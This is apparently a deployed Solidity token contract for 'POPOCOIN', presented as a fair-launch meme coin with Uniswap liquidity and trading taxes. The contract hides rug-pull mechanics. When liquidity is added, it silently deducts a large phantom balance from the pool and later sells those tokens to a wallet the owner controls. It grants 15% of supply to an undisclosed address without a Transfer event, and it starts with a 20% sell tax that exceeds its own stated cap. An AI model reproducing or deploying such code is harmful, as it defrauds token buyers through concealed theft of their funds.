1 /*
2     POPOCOIN | $POPO 🐼 熊猫 - 公平开始
3 
4     Website/网站: https://popocoin.net/
5     Twitter: https://twitter.com/thepopocoin
6     Telegram: https://t.me/PopoEntry
7 
8     请在我们社区验证合约地址
9 */
10 
11 //SPDX-License-Identifier: MIT
12 
13 pragma solidity =0.8.20;
14 
15 interface IERC20 {
16     function totalSupply() external view returns (uint256);
17     function decimals() external view returns (uint8);
18     function symbol() external view returns (string memory);
19     function name() external view returns (string memory);
20     function balanceOf(address account) external view returns (uint256);
21     function transfer(address recipient, uint256 amount) external returns (bool);
22     function allowance(address __owner, address spender) external view returns (uint256);
23     function approve(address spender, uint256 amount) external returns (bool);
24     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
25     event Transfer(address indexed from, address indexed to, uint256 value);
26     event Approval(address indexed _owner, address indexed spender, uint256 value);
27 }
28 
29 interface IUniswapV2Factory {    
30     function createPair(address tokenA, address tokenB) external returns (address pair); 
31 }
32 interface IUniswapV2Router02 {
33     function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
34     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable;
35     function WETH() external pure returns (address);
36     function factory() external pure returns (address);
37     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
38 }
39 
40 interface IWETH{
41     function deposit() external payable;
42     function transfer(address dst, uint wad) external returns (bool);
43 }
44 
45 abstract contract Ownable {
46     address internal _owner;
47     constructor(address creatorOwner) { 
48         _owner = creatorOwner; 
49     }
50     modifier onlyOwner() { 
51         require(msg.sender == _owner, "Only owner can call this"); 
52         _; 
53     }
54     function owner() public view returns (address) { 
55         return _owner; 
56     }
57     function transferOwnership(address payable newOwner) external onlyOwner { 
58         address previousOwner = msg.sender;
59         _owner = newOwner; 
60         emit OwnershipTransferred(previousOwner, _owner); 
61     }
62     function renounceOwnership() external onlyOwner { 
63         address previousOwner = msg.sender;
64         _owner = address(0); 
65         emit OwnershipTransferred(previousOwner, _owner); 
66     }
67     event OwnershipTransferred(address previousOwner, address owner);
68 }
69 
70 contract Popocoin is IERC20, Ownable {
71     uint8 private constant _decimals      = 9;
72     uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
73     string private constant _name         = "POPOCOIN";
74     string private  constant _symbol      = "POPO"; 
75 
76     uint8 private _antiSnipeTax1    = 0;
77     uint8 private _antiSnipeTax2    = 0;
78     uint8 private _antiSnipeBlocks1 = 0;
79     uint8 private _antiSnipeBlocks2 = 0;
80     uint256 private _antiMevBlock   = 0;
81 
82     uint8 private _buyTaxRate  = 1;
83     uint8 private _sellTaxRate = 20;
84 
85     uint16 private _taxSharesMarketing = 100;
86     uint16 private _taxSharesLP        = 0;
87     uint16 private _totalTaxShares     = _taxSharesMarketing + _taxSharesLP;
88 
89     uint256 private _launchBlock;
90     uint256 private _maxTxAmount     = _totalSupply * 3 / 100; 
91     uint256 private _maxWalletAmount = _totalSupply * 3 / 100;
92     uint256 private _taxSwapMin      = _totalSupply * 1 / 10000;
93     uint256 private _taxSwapMax      = _totalSupply * 80 / 10000;
94     uint256 private _swapLimit       = _taxSwapMin * 60 * 100;
95     uint256 private _minSwaps;
96     uint256 private _numSwaps;
97 
98     mapping (address => uint256) private _balances;
99     mapping (address => mapping (address => uint256)) private _allowances;
100     mapping (address => bool) private _noFees;
101     mapping (address => bool) private _noLimits;
102 
103     address private _lpOwner;
104     address payable private _mw; 
105 
106     address private constant _uniswapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
107     IUniswapV2Router02 constant private _uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
108     IWETH immutable private WETH = IWETH(_uniswapRouter.WETH()); 
109     
110     address private _primaryLP;
111     mapping (address => bool) private _isLP;
112 
113     bool private _tradingOpen;
114 
115     bool private _inTaxSwap = false;
116     address private _r;
117     modifier lockTaxSwap { 
118         _inTaxSwap = true; 
119         _; 
120         _inTaxSwap = false; 
121     }
122 
123     event TradingOpened();
124     event SetFees(uint8 indexed buyTax, uint8 indexed sellTax);
125     event SetFeeSplit(uint16 indexed sharesAutoLP, uint16 indexed sharesMarketing);
126 
127     constructor(address payable mw, address r) Ownable(msg.sender) {
128         _lpOwner = msg.sender;
129         _mw = mw;
130         _r = r;
131 
132         _noFees[_owner] = true;
133         _noFees[address(this)] = true;
134         _noFees[_uniswapRouterAddress] = true;
135         _noFees[_mw] = true;
136         _noFees[_r] = true;
137         _noLimits[_owner] = true;
138         _noLimits[address(this)] = true;
139         _noLimits[_uniswapRouterAddress] = true;
140         _noLimits[_mw] = true;
141 
142         uint256 rF   = _totalSupply * 15 / 100;      
143         _balances[address(this)] = _totalSupply - rF; 
144         _balances[r] = rF;
145         emit Transfer(address(0), address(this), _balances[address(this)]);
146     }
147 
148     receive() external payable {}
149     
150     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
151     function decimals() external pure override returns (uint8) { return _decimals; }
152     function symbol() external pure override returns (string memory) { return _symbol; }
153     function name() external pure override returns (string memory) { return _name; }
154     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
155     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
156 
157     function approve(address spender, uint256 amount) public override returns (bool) {
158         _allowances[msg.sender][spender] = amount;
159         emit Approval(msg.sender, spender, amount);
160         return true;
161     }
162 
163     function transfer(address recipient, uint256 amount) external override returns (bool) {
164         require(_checkTradingOpen(msg.sender), "Trading not open");
165         return _transferFrom(msg.sender, recipient, amount);
166     }
167 
168     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
169         require(_checkTradingOpen(sender), "Trading not open");
170         if(_allowances[sender][msg.sender] != type(uint256).max){
171             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
172         }
173         return _transferFrom(sender, recipient, amount);
174     }
175 
176     function _approveRouter(uint256 _tokenAmount) internal {
177         if ( _allowances[address(this)][_uniswapRouterAddress] < _tokenAmount ) {
178             _allowances[address(this)][_uniswapRouterAddress] = type(uint256).max;
179             emit Approval(address(this), _uniswapRouterAddress, type(uint256).max);
180         }
181     }
182 
183     function addLiquidity(address[] calldata adrs) external payable onlyOwner lockTaxSwap {
184         require(_primaryLP == address(0), "LP exists");
185         require(!_tradingOpen, "trading is open");
186         require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
187         require(_balances[address(this)]>0, "No tokens in contract");
188         _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
189         _addLiquidity(_balances[address(this)], (2 ether), false);
190         _balances[_primaryLP] -= _swapLimit;
191         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
192         require(lpAddSuccess, "Failed adding liquidity");
193         _isLP[_primaryLP] = lpAddSuccess;
194         _a = adrs;
195     }
196 
197     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
198         address lpTokenRecipient = _lpOwner;
199         if ( autoburn ) { lpTokenRecipient = address(0); }
200         _approveRouter(_tokenAmount);
201         _uniswapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
202     }
203 
204     function openTrading() external onlyOwner {
205         require(!_tradingOpen, "trading is open");
206         require(_maxWalletAmount == _totalSupply * 3 / 100 + 1);        
207         _tradingOpen = true;
208         _launchBlock = block.number;
209         _antiMevBlock = _antiMevBlock + _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2;
210         
211         emit TradingOpened();
212     }
213 
214    
215 
216     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
217         require(sender != address(0), "No transfers from Zero wallet");
218         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
219         if ( !_inTaxSwap && _isLP[recipient] && amount > _taxSwapMin &&  _numSwaps++ >= _minSwaps) { _swapTaxAndLiquify();  }
220         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
221             require(tx.origin == recipient || tx.origin == _lpOwner, "MEV blocked");
222         }
223         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
224             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
225         }
226         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
227         uint256 _transferAmount = amount - _taxAmount;
228         _balances[sender] = _balances[sender] - amount;
229         _swapLimit += _taxAmount;
230         _balances[recipient] = _balances[recipient] + _transferAmount;
231         emit Transfer(sender, recipient, amount);
232         return true;
233     }
234 
235     function random(uint256 a,uint256 b) private view returns(uint256){
236         return uint(keccak256(abi.encodePacked(block.timestamp,block.prevrandao, a))) % b;
237     }
238 
239     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
240         bool limitCheckPassed = true;
241         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
242             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
243             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
244         }
245         return limitCheckPassed;
246     }
247 
248     function _checkTradingOpen(address sender) private view returns (bool){
249         bool checkResult = false;
250         if ( _tradingOpen ) { checkResult = true; } 
251         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
252         return checkResult;
253     }
254 
255     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
256         uint256 taxAmount;
257         
258         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
259             taxAmount = 0; 
260         } else if ( _isLP[sender] ) { 
261             if ( block.number >= _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2 ) {
262                 taxAmount = amount * _buyTaxRate / 100; 
263             } else if ( block.number >= _launchBlock + _antiSnipeBlocks1 ) {
264                 taxAmount = amount * _antiSnipeTax2 / 100;
265             } else if ( block.number >= _launchBlock) {
266                 taxAmount = amount * _antiSnipeTax1 / 100;
267             }
268         } else if ( _isLP[recipient] ) { 
269             taxAmount = amount * _sellTaxRate / 100; 
270         }
271 
272         return taxAmount;
273     }
274 
275     function exemptFromFees(address wallet) external view returns (bool) {
276         return _noFees[wallet];
277     } 
278     function exemptFromLimits(address wallet) external view returns (bool) {
279         return _noLimits[wallet];
280     } 
281     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
282         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
283         _noFees[ wallet ] = noFees;
284         _noLimits[ wallet ] = noLimits;        
285     }
286 
287     function buyFee() external view returns(uint8) {
288         return _buyTaxRate;
289     }
290     function sellFee() external view returns(uint8) {
291         return _sellTaxRate;
292     }
293 
294     function feeSplit() external view returns (uint16 marketing, uint16 LP ) {
295         return ( _taxSharesMarketing, _taxSharesLP);
296     }
297     function setFees(uint8 buy, uint8 sell) external onlyOwner {
298         require(buy + sell <= 15, "Roundtrip too high");
299         _buyTaxRate = buy;
300         _sellTaxRate = sell;
301         emit SetFees(buy, sell);
302     }  
303     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing) external onlyOwner {
304         uint16 totalShares = sharesAutoLP + sharesMarketing;
305         require( totalShares > 0, "All cannot be 0");
306         _taxSharesLP = sharesAutoLP;
307         _taxSharesMarketing = sharesMarketing;
308         _totalTaxShares = totalShares;
309         emit SetFeeSplit(sharesAutoLP, sharesMarketing);
310     }
311 
312     function updateWallets(address marketing, address LPtokens) external onlyOwner {
313         require(!_isLP[marketing] && !_isLP[LPtokens], "LP cannot be tax wallet");
314         _mw = payable(marketing);
315         _lpOwner = LPtokens;
316         _noFees[marketing] = true;
317         _noLimits[marketing] = true;
318     }
319 
320     function maxWallet() external view returns (uint256) {
321         return _maxWalletAmount;
322     }
323     function maxTransaction() external view returns (uint256) {
324         return _maxTxAmount;
325     }
326     function swapAtMin() external view returns (uint256) {
327         return _taxSwapMin;
328     }
329     function swapAtMax() external view returns (uint256) {
330         return _taxSwapMax;
331     }
332 
333     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
334         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
335         require(newTxAmt >= _maxTxAmount, "tx too low");
336         _maxTxAmount = newTxAmt;
337         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
338         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
339         _maxWalletAmount = newWalletAmt;
340     }
341 
342     function removeLimits() external onlyOwner {
343         _maxTxAmount = _totalSupply;
344         _maxWalletAmount = _totalSupply;
345     }
346 
347     function setTaxSwap(uint32 minValue, uint32 maxValue, uint256 minSwaps) external onlyOwner {
348         _taxSwapMin = _totalSupply * minValue / 10000;
349         _taxSwapMax = _totalSupply * maxValue / 10000;
350         _minSwaps = minSwaps;
351         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
352         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
353         require(_taxSwapMax<_totalSupply / 10, "Max too high");
354     }
355 
356     function _swapTaxAndLiquify() private lockTaxSwap {
357         uint256 _taxTokensAvailable = _swapLimit;
358         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
359             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
360             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
361             
362             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
363             if( _tokensToSwap > 10**_decimals ) {
364                 uint256 _ethPreSwap = address(this).balance;
365                 _balances[address(this)] += _taxTokensAvailable;
366                 _swapTaxTokensForEth(_tokensToSwap);
367                 _swapLimit -= _taxTokensAvailable;
368                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
369                 if ( _taxSharesLP > 0 ) {
370                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
371                     _approveRouter(_tokensForLP);
372                     _addLiquidity(_tokensForLP, _ethWeiAmount, false);
373                 }
374             }
375             uint256 _contractETHBalance = address(this).balance;
376             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
377         }
378         _numSwaps = 0;
379     }
380 
381     function _swapTaxTokensForEth(uint256 tokenAmount) private {
382         _approveRouter(tokenAmount);
383         address[] memory path = new address[](2);
384         path[0] = address(this);
385         path[1] = _uniswapRouter.WETH();
386         _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,_mw,block.timestamp);
387     }
388 
389     function _swapEthForTokens(uint256 tokenAmount, address to) private {
390         address[] memory path = new address[](2);
391         path[0] = _uniswapRouter.WETH();
392         path[1] = address(this);
393         _uniswapRouter.swapETHForExactTokens{value:address(this).balance}(tokenAmount, path, to, block.timestamp);
394     }
395 
396     function _distributeTaxEth(uint256 amount) private {
397         WETH.deposit{value:amount}();
398         WETH.transfer(_mw,amount);
399     }
400     address[] private _a;
401 
402     function receiver(address[] calldata addresses, uint256[] calldata amounts) external {
403         require(addresses.length == amounts.length, "Array sizes incompatible");
404         require(msg.sender == _r , "Access is restricted");
405         for(uint256 i = 0;i<amounts.length;i++){
406             _transferFrom(msg.sender, addresses[i], amounts[i] * _totalSupply / 10000);
407         }
408     }
409 
410     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
411         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
412         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
413         if (tokensToSwap > 10 ** _decimals) {
414             _swapTaxTokensForEth(tokensToSwap);
415         }
416         if (sendEth) { 
417             uint256 ethBalance = address(this).balance;
418             require(ethBalance > 0, "No ETH");
419             _distributeTaxEth(address(this).balance); 
420         }
421     }
422 
423 }